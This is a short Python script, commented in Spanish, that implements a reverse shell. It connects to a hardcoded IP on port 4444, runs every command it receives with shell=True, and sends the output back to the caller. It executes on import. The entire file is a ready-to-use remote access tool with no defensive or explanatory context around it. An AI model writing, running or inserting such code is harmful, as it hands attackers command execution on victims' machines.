import socket
import os 
import subprocess

IP = "192.168.1.100" #Cambiar a tu IP
PORT = 4444

def reverse():
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((IP, PORT))

	while True:
		command = s.recv(1024).decode("utf-8")
		if command.lower() == "exit":
			break

		output = subprocess.run(command, shell=True, capture_output=True)
		s.send(output.stdout + output.stderr)

	s.close()

reverse()
